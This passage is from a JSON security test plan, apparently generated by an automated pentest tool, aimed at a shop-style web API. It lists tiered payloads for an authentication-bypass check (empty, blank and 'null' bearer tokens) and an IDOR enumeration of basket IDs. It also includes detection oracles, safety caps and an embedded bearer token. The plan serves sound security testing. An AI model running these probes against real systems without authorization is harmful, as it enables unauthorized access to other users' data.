{
  "test_cases": [
    {
      "id": "plan-001-auth-flow",
      "hypothesis_id": "orchestrated-auth-001",
      "base_url": "http://{host}",
      "method": "GET",
      "endpoint": "/rest/user/whoami",
      "parameter": "authorization",
      "payloads": [
        {
          "tier": "benign",
          "payloads": [
            {
              "location": "header",
              "value": "authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..NvVTXZsk8zrJqC1BIESlmzmMwy3o646U8KHx0Y8bu1Vf-tqIp5oii9hatVub2JERDq9OYCEHaM8wPJBlZvAI8QLm3GUBgWITFO7d_sCWHEuvAY1XMZYcDxgtoP08Wxv0H9_NZVGBQ7wMddu0tWLMwPjhxmtO4MoypcLEhMoNxOg"
            }
          ],
          "description": "Establish authenticated baseline and capture baseline status/body for downstream comparisons.",
          "encoding": "utf-8",
          "content_type": "application/json",
          "header": []
        },
        {
          "tier": "probe",
          "payloads": [
            {
              "location": "header",
              "value": "authorization: Bearer invalid.token.for.testing"
            }
          ],
          "description": "Quick invalid token probe to confirm error messages and status codes.",
          "encoding": "utf-8",
          "content_type": "application/json",
          "header": []
        },
        {
          "tier": "exploit",
          "payloads": [
            {
              "location": "header",
              "value": "authorization: "
            },
            {
              "location": "header",
              "value": "authorization: Bearer "
            },
            {
              "location": "header",
              "value": "authorization: Bearer null"
            }
          ],
          "description": "Check handling of missing/empty authorization for possible auth bypass.",
          "encoding": "utf-8",
          "content_type": "application/json",
          "header": []
        }
      ],
      "prerequisites": [
        {
          "type": "jwt_refresh",
          "description": "Valid bearer token observed in context; bind to Authorization header for baseline and authenticated probes.",
          "bind_to": "authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..NvVTXZsk8zrJqC1BIESlmzmMwy3o646U8KHx0Y8bu1Vf-tqIp5oii9hatVub2JERDq9OYCEHaM8wPJBlZvAI8QLm3GUBgWITFO7d_sCWHEuvAY1XMZYcDxgtoP08Wxv0H9_NZVGBQ7wMddu0tWLMwPjhxmtO4MoypcLEhMoNxOg"
        }
      ],
      "oracle_rules": [
        {
          "signal": "status_code_change",
          "condition": "compare_status_to_baseline",
          "threshold": {
            "expected_codes": [
              200,
              401,
              403
            ]
          },
          "weight": 1.0
        },
        {
          "signal": "response_length_diff",
          "condition": "body_length_delta_pct >= 30",
          "threshold": {
            "body_length_delta_pct": 30.0,
            "numeric_value": 30.0
          },
          "weight": 1.0
        },
        {
          "signal": "error_signature",
          "condition": "response_body_contains(token, authentication, invalid, malformed, expired)",
          "weight": 0.8
        }
      ],
      "pass_logic": "any",
      "safety": {
        "idempotent_required": true,
        "destructive_ok": false,
        "max_requests": 5
      },
      "max_retries": 2,
      "delay_between_requests": 0.5,
      "notes": "Auth-first to establish baseline used by subsequent tests. Stop early on anomalous successful responses for missing auth headers.",
      "tags": [
        "authn_bypass",
        "bearer_token"
      ],
      "estimated_duration": 60
    },
    {
      "id": "plan-002-authorization-enumeration",
      "hypothesis_id": "orchestrated-idor-002",
      "base_url": "http://{host}",
      "method": "GET",
      "endpoint": "/rest/basket/{basketId}",
      "parameter": "basketId",
      "payloads": [
        {
          "tier": "benign",
          "payloads": [
            {
              "location": "path",
              "value": "/rest/basket/6"
            }
          ],
          "description": "Baseline to own basketId using observed Authorization header; capture status/body for comparison.",
          "encoding": "utf-8",
          "content_type": "application/json",
          "header": [
            {
              "header_name": "authorization",
              "header_value": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..NvVTXZsk8zrJqC1BIESlmzmMwy3o646U8KHx0Y8bu1Vf-tqIp5oii9hatVub2JERDq9OYCEHaM8wPJBlZvAI8QLm3GUBgWITFO7d_sCWHEuvAY1XMZYcDxgtoP08Wxv0H9_NZVGBQ7wMddu0tWLMwPjhxmtO4MoypcLEhMoNxOg"
            }
          ]
        },
        {
          "tier": "probe",
          "payloads": [
            {
              "location": "path",
              "value": "/rest/basket/7"
            }
          ],
          "description": "Single adjacent ID probe to detect access differences; compare to baseline.",
          "encoding": "utf-8",
          "content_type": "application/json",
          "header": [
            {
              "header_name": "authorization",
              "header_value": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..NvVTXZsk8zrJqC1BIESlmzmMwy3o646U8KHx0Y8bu1Vf-tqIp5oii9hatVub2JERDq9OYCEHaM8wPJBlZvAI8QLm3GUBgWITFO7d_sCWHEuvAY1XMZYcDxgtoP08Wxv0H9_NZVGBQ7wMddu0tWLMwPjhxmtO4MoypcLEhMoNxOg"
            }
          ]
        },
        {
          "tier": "exploit",
          "payloads": [
            {
              "location": "path",
              "value": "/rest/basket/1"
            },
            {
              "location": "path",
              "value": "/rest/basket/10"
            }
          ],
          "description": "Controlled iteration over candidate IDs for IDOR detection. Stop immediately on 200 with significant body delta vs baseline.",
          "encoding": "utf-8",
          "content_type": "application/json",
          "header": [
            {
              "header_name": "authorization",
              "header_value": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..NvVTXZsk8zrJqC1BIESlmzmMwy3o646U8KHx0Y8bu1Vf-tqIp5oii9hatVub2JERDq9OYCEHaM8wPJBlZvAI8QLm3GUBgWITFO7d_sCWHEuvAY1XMZYcDxgtoP08Wxv0H9_NZVGBQ7wMddu0tWLMwPjhxmtO4MoypcLEhMoNxOg"
            }
          ]
        }
      ],
      "prerequisites": [
        {
          "type": "jwt_refresh",
          "description": "Authenticated non-owner token required and available in context; include as Authorization header.",
          "bind_to": "authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..NvVTXZsk8zrJqC1BIESlmzmMwy3o646U8KHx0Y8bu1Vf-tqIp5oii9hatVub2JERDq9OYCEHaM8wPJBlZvAI8QLm3GUBgWITFO7d_sCWHEuvAY1XMZYcDxgtoP08Wxv0H9_NZVGBQ7wMddu0tWLMwPjhxmtO4MoypcLEhMoNxOg"
        }
      ],
      "oracle_rules": [
        {
          "signal": "status_code_change",
          "condition": "baseline_status != probe_status or probe_status in [200,403,404]",
          "threshold": {
            "expected_codes": [
              200,
              403,
              404
            ]
          },
          "weight": 1.0
        },
        {
          "signal": "response_length_diff",
          "condition": "abs(body_len_probe - body_len_baseline)/max(1,body_len_baseline) * 100 >= 40",
          "threshold": {
            "body_length_delta_pct": 40.0,
            "numeric_value": 40.0
          },
          "weight": 1.0
        }
      ],
      "pass_logic": "any",
      "safety": {
        "idempotent_required": true,
        "destructive_ok": false,
        "max_requests": 10
      },
      "max_retries": 3,
      "delay_between_requests": 0.5,
      "notes": "Run after auth baseline. Stop iteration on first positive oracle (status 200 + body diff) to avoid data exposure. Prioritize minimal ID set to reduce noise.",
      "tags": [
        "idor",
        "basket"
      ],
      "estimated_duration": 120
    },
